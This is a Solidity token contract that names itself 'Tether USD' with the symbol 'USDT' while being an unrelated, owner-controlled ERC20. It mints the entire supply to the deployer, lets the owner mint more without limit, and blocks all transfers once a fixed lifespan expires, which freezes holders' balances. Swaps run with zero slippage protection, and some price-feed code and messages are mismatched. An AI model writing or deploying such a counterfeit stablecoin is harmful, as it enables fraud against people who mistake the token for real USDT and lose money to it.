// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

// Interface for interacting with the USDT contract
interface IUSDT {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract TetherToken is ERC20 {
    address public immutable owner; // Marked owner as immutable
    AggregatorV3Interface internal usdtEthPriceFeed; // Chainlink price feed for USDT/ETH
    AggregatorV3Interface internal usdtUsdPriceFeed; // Chainlink price feed for USDT/USD
    IUSDT public usdt; // USDT contract interface

    IUniswapV2Router02 public uniswapRouter;
    address public uniswapPair; // Uniswap pair address for Token/ETH or Token/USDT

    uint256 public constant TOTAL_SUPPLY = 100_000_000 * 10**6; // 100 million tokens with 6 decimals
    uint256 public constant LIFESPAN = 3250 days; // 3250 days lifespan (approximately 8.9 years)
    uint256 public immutable deploymentTime; // Time when the contract was deployed

    // Events for transparency and tracking
    event TokensMinted(address indexed to, uint256 amount);
    event TokensBurned(address indexed from, uint256 amount);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount);
    event LiquidityRemoved(uint256 liquidity);
    event TokensSwappedForETH(uint256 tokenAmount, uint256 ethReceived);
    event ETHSwappedForTokens(uint256 ethAmount, uint256 tokenAmount);
    event TokensSwappedForTokens(address indexed fromToken, address indexed toToken, uint256 fromAmount, uint256 toAmount);

    constructor(
        address _usdtEthPriceFeed,
        address _usdtUsdPriceFeed,
        address _usdtAddress,
        address _uniswapRouter
    ) ERC20("Tether USD", "USDT") {
        owner = msg.sender;
        usdtEthPriceFeed = AggregatorV3Interface(_usdtEthPriceFeed);
        usdtUsdPriceFeed = AggregatorV3Interface(_usdtUsdPriceFeed);
        usdt = IUSDT(_usdtAddress);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        deploymentTime = block.timestamp;

        _mint(owner, TOTAL_SUPPLY); // Mint the total supply to the owner's address

        // Create a Uniswap pair for this token with ETH
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = factory.createPair(address(this), uniswapRouter.WETH());
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    modifier checkLifespan() {
        require(block.timestamp <= deploymentTime + LIFESPAN, "Token lifespan expired");
        _;
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function getLatestUsdtEthPrice() public view returns (uint256) {
        (, int price, , , ) = usdtEthPriceFeed.latestRoundData();
        require(price > 0, "Invalid ETH/USD price");
        return uint256(price);
    }

    function getLatestUsdtUsdPrice() public view returns (uint256) {
        (, int price, , , ) = usdtUsdPriceFeed.latestRoundData();
        require(price > 0, "Invalid USDT/USD price");
        return uint256(price);
    }

    function getTokenPriceInEth() public view returns (uint256) {
        uint256 ethUsdPrice = getLatestUsdtEthPrice();
        require(ethUsdPrice > 0, "Invalid ETH/USD price from Chainlink");
        return 10**18 / ethUsdPrice;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) external onlyOwner {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );
        emit LiquidityAdded(tokenAmount, ethAmount);
    }

    function swapTokensForEth(uint256 tokenAmount) external onlyOwner {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uniswapRouter.swapExactTokensForETH(
            tokenAmount,
            0, // slippage is unavoidable
            path,
            owner,
            block.timestamp
        );

        emit TokensSwappedForETH(tokenAmount, address(this).balance);
    }

    function swapEthForTokens(uint256 tokenAmount) external onlyOwner payable {
        address[] memory path = new address[](2);
        path[0] = uniswapRouter.WETH();
        path[1] = address(this);

        uniswapRouter.swapExactETHForTokens{value: msg.value}(
            0, // slippage is unavoidable
            path,
            owner,
            block.timestamp
        );

        emit ETHSwappedForTokens(msg.value, tokenAmount);
    }

    // Function to swap any ERC20 token for this token
    function swapTokensForTokens(address fromToken, uint256 fromAmount) external onlyOwner {
        require(fromToken != address(0), "Invalid fromToken address");

        // Approve the Uniswap router to spend the `fromToken`
        IERC20(fromToken).approve(address(uniswapRouter), fromAmount);

        address[] memory path = new address[](3);
        path[0] = fromToken; // the input token
        path[1] = uniswapRouter.WETH(); // intermediate token (ETH)
        path[2] = address(this); // the output token (this token)

        uint[] memory amounts = uniswapRouter.swapExactTokensForTokens(
            fromAmount,
            0, // slippage is unavoidable
            path,
            owner,
            block.timestamp
        );

        emit TokensSwappedForTokens(fromToken, address(this), fromAmount, amounts[2]);
    }

    function removeLiquidity(uint256 liquidity) external onlyOwner {
        IUniswapV2Factory factory = IUniswapV2Factory(uniswapRouter.factory());
        address pair = factory.getPair(address(this), uniswapRouter.WETH());
        require(pair != address(0), "Liquidity pair not found");

        _approve(address(this), address(uniswapRouter), liquidity);
        uniswapRouter.removeLiquidityETH(
            address(this),
            liquidity,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );

        emit LiquidityRemoved(liquidity);
    }

    function mint(address to, uint256 amount) external onlyOwner checkLifespan {
        _mint(to, amount);
        emit TokensMinted(to, amount);
    }

    function burn(uint256 amount) external onlyOwner checkLifespan {
        _burn(msg.sender, amount);
        emit TokensBurned(msg.sender, amount);
    }

    function transfer(address recipient, uint256 amount) public override checkLifespan returns (bool) {
        return super.transfer(recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override checkLifespan returns (bool) {
        return super.transferFrom(sender, recipient, amount);
    }

    function checkUSDTBalance(address account) external view returns (uint256) {
        return usdt.balanceOf(account);
    }

    function transferUSDT(address recipient, uint256 amount) external onlyOwner {
        usdt.transfer(recipient, amount);
    }

    receive() external payable {}
}